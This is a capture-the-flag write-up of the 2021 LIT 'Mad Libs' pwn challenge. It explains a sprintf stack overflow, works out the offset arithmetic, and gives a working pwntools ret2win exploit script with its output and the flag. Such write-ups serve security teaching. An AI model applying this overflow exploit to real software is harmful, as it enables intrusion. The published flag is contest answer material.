# Lexington Informatics Tournament CTF 2021

## pwn/Mad Libs

> Rythm 
> 
> I made a fun mad libs game in C. I even got the formatters all right, at least I think. You should try it out!
> 
> `nc madlibs.litctf.live 1337`
>
> [madlibs_pwn.zip](madlibs_pwn.zip)


Tags: _pwn_ _x86-64_ _bof_ _ret2win_


## Summary

Basic `sprintf` BOF for ret2win.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, easy ROP.  No canary, easy BOF.  Partial RELRO, easy GOT.


### Decompile with Ghidra

```c
void win(void)
{
  char local_48 [56];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Something is wrong. Please contact Rythm.");
    exit(1);
  }
  fgets(local_48,0x30,local_10);
  puts("Huh, I guess you did win. How does that even work? Well, here\'s the flag:");
  puts(local_48);
  return;
}
```

`win` function included, nice.


```c
void game(void)
{
  char local_108 [128];
  undefined local_88 [64];
  undefined local_48 [64];
  
  puts("First, enter a proper noun.");
  __isoc99_scanf(&%63s,local_48);
  puts("");
  puts("Now, enter an adjective.");
  __isoc99_scanf(&%63s,local_88);
  puts("");
  puts("Now, I\'ll combine them into a great sentence!\n");
  sprintf(local_108,"%s is so %s at deepspacewaifu! I wish I were %s like %s",local_48,local_88,local_88,local_48);
  puts("The final sentence is:");
  printf("\"%s\"\n",local_108);
  puts("");
  return;
}
```

`sprintf` is a buffer overflow vulnerability.

`local_108` is `0x108` from the return address, all that is necessary to get the flag is to overflow the buffer with `0x108` bytes followed by the address of `win`.  Easy.

`sprintf` write to buffer `local_108` the contents of `local_48` and `local_88` twice with `local_48` being last, so that's where we need to put our exploit.

It's important we do not use nulls in our exploit, they will just terminate the strings and `sprintf` will not write out more complex attacks like ROP chains.

Since this binary has no PIE the address for `main`, `game`, and `win` are all 3 bytes and are known, and since `main` called `game`, the return address will only be 3 bytes long.  So, we just need 3 bytes.

The math is pretty simple:  `0x108 + 3` (buffer size + payload) `- 2 * (60+3)` (max size of `local_48` (see `scanf`) is `63`) - `47` (the string `%s is so %s at deepspacewaifu! I wish I were %s like %s` with the `%s` removed).  That equals `94`, divide that by 2 to get the length of `local_88`:

`0x108 + 3 - 2 * 64 - 47 = 94; 94/2 = 47`

> Yeah `47` again, it is just a coincident, you could use `59+3` and `48` if you like 



## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./madlibs')

if args.REMOTE:
    p = remote('madlibs.lit-ctf-2021-2-codelab.kctf.cloud', 1337)
else:
    p = process(binary.path)

payload  = 60 * b'A'
payload += p64(binary.sym.win)[0:3]
payload += 47 * b'B'

p.sendline(payload)
p.stream()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/litctf2021/madlibs_pwn/madlibs'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to madlibs.lit-ctf-2021-2-codelab.kctf.cloud on port 1337: Done
== proof-of-work: disabled ==
I made a quick mad libs game!

First, enter a proper noun.

Now, enter an adjective.

Now, I'll combine them into a great sentence!

The final sentence is:
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x92\x11 is so BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB at deepspacewaifu! I wish I were cewaifu! I wish I were BBBBBBBBBBBBBBBBBBBBBBBB like BBBBBB like AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x92\x11"

Huh, I guess you did win. How does that even work? Well, here's the flag:
flag{n0w_1m_k1nd4_m4d_4t_th3_l1bs}
```
